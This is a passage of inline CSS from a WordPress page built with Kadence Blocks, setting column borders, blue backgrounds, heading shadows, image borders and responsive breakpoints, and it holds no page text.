(max-width: 1024px){.kadence-column76_6b02ee-d0 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_6b02ee-d0 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_987de9-ef > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_987de9-ef > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_987de9-ef > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_987de9-ef > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_987de9-ef > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_987de9-ef, .kt-inside-inner-col > .kadence-column76_987de9-ef:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_987de9-ef > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_987de9-ef > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_a06b8e-f6, .wp-block-kadence-advancedheading.kt-adv-heading76_a06b8e-f6[data-kb-block="kb-adv-heading76_a06b8e-f6"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_a06b8e-f6 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_a06b8e-f6[data-kb-block="kb-adv-heading76_a06b8e-f6"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_a06b8e-f6 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_a06b8e-f6[data-kb-block="kb-adv-heading76_a06b8e-f6"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_a06b8e-f6, .wp-block-kadence-advancedheading.kt-adv-heading76_a06b8e-f6[data-kb-block="kb-adv-heading76_a06b8e-f6"]{font-size:22px;}}.wp-block-kadence-image.kb-image76_be20f2-9b:not(.kb-specificity-added):not(.kb-extra-specificity-added){margin-bottom:30px;}.kb-image76_be20f2-9b .kb-image-has-overlay:after{opacity:0.3;}.kb-image76_be20f2-9b img.kb-img, .kb-image76_be20f2-9b .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);box-shadow:2px 2px 14px 0px #244893;}@media all and (max-width: 1024px){.kb-image76_be20f2-9b img.kb-img, .kb-image76_be20f2-9b .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}@media all and (max-width: 767px){.kb-image76_be20f2-9b.kb-image-is-ratio-size, .kb-image76_be20f2-9b .kb-image-is-ratio-size{max-width:150px;width:100%;}.kb-image76_be20f2-9b figure{max-width:150px;}.kb-image76_be20f2-9b img.kb-img, .kb-image76_be20f2-9b .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}.kb-row-layout-id76_bc0ee9-2b > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_bc0ee9-2b > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_63679c-aa > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_63679c-aa > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_63679c-aa > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_63679c-aa > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_63679c-aa > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_63679c-aa, .kt-inside-inner-col > .kadence-column76_63679c-aa:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_63679c-aa > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_63679c-aa > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_792e01-bb > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_792e01-bb > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_792e01-bb > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_792e01-bb > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_792e01-bb > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_792e01-bb, .kt-inside-inner-col > .kadence-column76_792e01-bb:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_792e01-bb > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_792e01-bb > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_cf80fe-03, .wp-block-kadence-advancedheading.kt-adv-heading76_cf80fe-03[data-kb-block="kb-adv-heading76_cf80fe-03"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_cf80fe-03 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_cf80fe-03[data-kb-block="kb-adv-heading76_cf80fe-03"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_cf80fe-03 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_cf80fe-03[data-kb-block="kb-adv-heading76_cf80fe-03"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_cf80fe-03, .wp-block-kadence-advancedheading.kt-adv-heading76_cf80fe-03[data-kb-block="kb-adv-heading76_cf80fe-03"]{font-size:22px;}}.kb-row-layout-id76_af4761-eb > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_af4761-eb > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_19c824-19 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_19c824-19 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_19c824-19 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_19c824-19 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_19c824-19 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_19c824-19, .kt-inside-inner-col > .kadence-column76_19c824-19:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_19c824-19 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_19c824-19 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_155d9c-75 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_155d9c-75 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_155d9c-75 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_155d9c-75 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_155d9c-75 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_155d9c-75, .kt-inside-inner-col > .kadence-column76_155d9c-75:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_155d9c-75 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_155d9c-75 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_3763f7-3f, .wp-block-kadence-advancedheading.kt-adv-heading76_3763f7-3f[data-kb-block="kb-adv-heading76_3763f7-3f"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_3763f7-3f mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_3763f7-3f[data-kb-block="kb-adv-heading76_3763f7-3f"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_3763f7-3f img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_3763f7-3f[data-kb-block="kb-adv-heading76_3763f7-3f"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_3763f7-3f, .wp-block-kadence-advancedheading.kt-adv-heading76_3763f7-3f[data-kb-block="kb-adv-heading76_3763f7-3f"]{font-size:22px;}}.kb-row-layout-id76_045ef5-32 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_045ef5-32 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_2bb1df-2b > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_2bb1df-2b > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_2bb1df-2b > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_2bb1df-2b > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_2bb1df-2b > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_2bb1df-2b, .kt-inside-inner-col > .kadence-column76_2bb1df-2b:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_2bb1df-2b > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_2bb1df-2b > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_c1b3bf-77 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_c1b3bf-77 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_c1b3bf-77 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_c1b3bf-77 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_c1b3bf-77 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_c1b3bf-77, .kt-inside-inner-col > .kadence-column76_c1b3bf-77:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_c1b3bf-77 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_c1b3bf-77 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_531b33-b3, .wp-block-kadence-advancedheading.kt-adv-heading76_531b33-b3[data-kb-block="kb-adv-heading76_531b33-b3"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_531b33-b3 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_531b33-b3[data-kb-block="kb-adv-heading76_531b33-b3"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_531b33-b3 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_531b33-b3[data-kb-block="kb-adv-heading76_531b33-b3"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_531b33-b3, .wp-block-kadence-advancedheading.kt-adv-heading76_531b33-b3[data-kb-block="kb-adv-heading76_531b33-b3"]{font-size:22px;}}.wp-block-kadence-image.kb-image76_97b13f-80:not(.kb-specificity-added):not(.kb-extra-specificity-added){margin-bottom:30px;}.kb-image76_97b13f-80 .kb-image-has-overlay:after{opacity:0.3;}.kb-image76_97b13f-80 img.kb-img, .kb-image76_97b13f-80 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);box-shadow:2px 2px 14px 0px #244893;}@media all and (max-width: 1024px){.kb-image76_97b13f-80 img.kb-img, .kb-image76_97b13f-80 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}@media all and (max-width: 767px){.kb-image76_97b13f-80.kb-image-is-ratio-size, .kb-image76_97b13f-80 .kb-image-is-ratio-size{max-width:150px;width:100%;}.kb-image76_97b13f-80 figure{max-width:150px;}.kb-image76_97b13f-80 img.kb-img, .kb-image76_97b13f-80 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}.kb-row-layout-id76_75d924-72 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_75d924-72 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_70c866-f7 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_70c866-f7 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_70c866-f7 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_70c866-f7 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_70c866-f7 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_70c866-f7, .kt-inside-inner-col > .kadence-column76_70c866-f7:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_70c866-f7 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_70c866-f7 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_f5018e-4c > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_f5018e-4c > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_f5018e-4c > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_f5018e-4c > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_f5018e-4c > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_f5018e-4c, .kt-inside-inner-col > .kadence-column76_f5018e-4c:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_f5018e-4c > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_f5018e-4c > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_d0e1f5-b5, .wp-block-kadence-advancedheading.kt-adv-heading76_d0e1f5-b5[data-kb-block="kb-adv-heading76_d0e1f5-b5"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_d0e1f5-b5 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_d0e1f5-b5[data-kb-block="kb-adv-heading76_d0e1f5-b5"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_d0e1f5-b5 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_d0e1f5-b5[data-kb-block="kb-adv-heading76_d0e1f5-b5"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_d0e1f5-b5, .wp-block-kadence-advancedheading.kt-adv-heading76_d0e1f5-b5[data-kb-block="kb-adv-heading76_d0e1f5-b5"]{font-size:22px;}}.kb-row-layout-id76_4ba264-d5 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_4ba264-d5 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_2aeacb-ed > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_2aeacb-ed > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_2aeacb-ed > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_2aeacb-ed > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_2aeacb-ed > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_2aeacb-ed, .kt-inside-inner-col > .kadence-column76_2aeacb-ed:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_2aeacb-ed > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_2aeacb-ed > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_377740-f2 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_377740-f2 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_377740-f2 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_377740-f2 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_377740-f2 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_377740-f2, .kt-inside-inner-col > .kadence-column76_377740-f2:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_377740-f2 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_377740-f2 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_7ba88b-30, .wp-block-kadence-advancedheading.kt-adv-heading76_7ba88b-30[data-kb-block="kb-adv-heading76_7ba88b-30"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_7ba88b-30 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_7ba88b-30[data-kb-block="kb-adv-heading76_7ba88b-30"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_7ba88b-30 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_7ba88b-30[data-kb-block="kb-adv-heading76_7ba88b-30"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_7ba88b-30, .wp-block-kadence-advancedheading.kt-adv-heading76_7ba88b-30[data-kb-block="kb-adv-heading76_7ba88b-30"]{font-size:22px;}}.kb-row-layout-id76_dc02cb-f3 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_dc02cb-f3 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_f837d2-4f > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_f837d2-4f > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_f837d2-4f > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_f837d2-4f > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_f837d2-4f > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_f837d2-4f, .kt-inside-inner-col > .kadence-column76_f837d2-4f:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_f837d2-4f > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_f837d2-4f > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_c24f5f-23 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_c24f5f-23 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_c24f5f-23 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_c24f5f-23 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_c24f5f-23 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_c24f5f-23, .kt-inside-inner-col > .kadence-column76_c24f5f-23:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_c24f5f-23 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_c24f5f-23 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_39d762-4c, .wp-block-kadence-advancedheading.kt-adv-heading76_39d762-4c[data-kb-block="kb-adv-heading76_39d762-4c"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_39d762-4c mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_39d762-4c[data-kb-block="kb-adv-heading76_39d762-4c"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_39d762-4c img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_39d762-4c[data-kb-block="kb-adv-heading76_39d762-4c"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_39d762-4c, .wp-block-kadence-advancedheading.kt-adv-heading76_39d762-4c[data-kb-block="kb-adv-heading76_39d762-4c"]{font-size:22px;}}.wp-block-kadence-image.kb-image76_b2cd44-c2:not(.kb-specificity-added):not(.kb-extra-specificity-added){margin-bottom:30px;}.kb-image76_b2cd44-c2 .kb-image-has-overlay:after{opacity:0.3;}.kb-image76_b2cd44-c2 img.kb-img, .kb-image76_b2cd44-c2 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);box-shadow:2px 2px 14px 0px #244893;}@media all and (max-width: 1024px){.kb-image76_b2cd44-c2 img.kb-img, .kb-image76_b2cd44-c2 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}@media all and (max-width: 767px){.kb-image76_b2cd44-c2.kb-image-is-ratio-size, .kb-image76_b2cd44-c2 .kb-image-is-ratio-size{max-width:150px;width:100%;}.kb-image76_b2cd44-c2 figure{max-width:150px;}.kb-image76_b2cd44-c2 img.kb-img, .kb-image76_b2cd44-c2 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}.kb-row-layout-id76_9ee6f7-95 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_9ee6f7-95 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_d63f41-40 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_d63f41-40 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_d63f41-40 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_d63f41-40 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_d63f41-40 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_d63f41-40, .kt-inside-inner-col > .kadence-column76_d63f41-40:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_d63f41-40 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_d63f41-40 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_75417e-79 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_75417e-79 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_75417e-79 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_75417e-79 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_75417e-79 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_75417e-79, .kt-inside-inner-col > .kadence-column76_75417e-79:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_75417e-79 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_75417e-79 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_de3c1d-73, .wp-block-kadence-advancedheading.kt-adv-heading76_de3c1d-73[data-kb-block="kb-adv-heading76_de3c1d-73"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_de3c1d-73 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_de3c1d-73[data-kb-block="kb-adv-heading76_de3c1d-73"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_de3c1d-73 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_de3c1d-73[data-kb-block="kb-adv-heading76_de3c1d-73"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_de3c1d-73, .wp-block-kadence-advancedheading.kt-adv-heading76_de3c1d-73[data-kb-block="kb-adv-heading76_de3c1d-73"]{font-size:22px;}}.kb-row-layout-id76_a59243-ca > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_a59243-ca > .kt-row-column-wrap{grid-template-columns:minmax(0, 